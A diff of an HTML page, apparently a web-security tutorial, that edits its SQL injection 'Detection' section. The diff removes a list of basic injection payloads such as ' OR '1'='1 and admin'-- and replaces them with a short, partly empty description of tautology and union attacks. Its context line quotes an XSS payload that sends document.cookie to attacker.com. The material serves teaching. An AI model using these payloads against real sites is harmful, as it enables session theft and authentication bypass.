@@ -446,21 +446,12 @@ fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie)
                 <h2 class="section-title">Detection</h2>
                 
                 <div class="card">
-                    <h3 class="card-title">Basic Tests</h3>
-                    <p>Start with these payloads to detect SQL injection:</p>
-                    <pre><code>'
-"
-1'
-1"
-1=1
-1=2
-' OR '1'='1
-" OR "1"="1
-' OR '1'='1'--
-" OR "1"="1"--
-' OR 1=1--
-" OR 1=1--
-admin'--</code></pre>
+                    <h3 class="card-title">Basic's</h3>
+                    <p>There are many types of SQL injections simply we are looking for any requests that could possibily involve the db. Here are some sqli techniques:</p>
+                    <ul class="indented-list">
+                        <li><strong>Tautology Attack:</strong> The main idea here is to target WHERE clause to always evaluate to true, often using comments like <code>--</code> to bypass authentication.</li>
+                        <li><strong>Union Attack:</strong> </li>
+                    </ul>
                 </div>
                 
                 <div class="card">
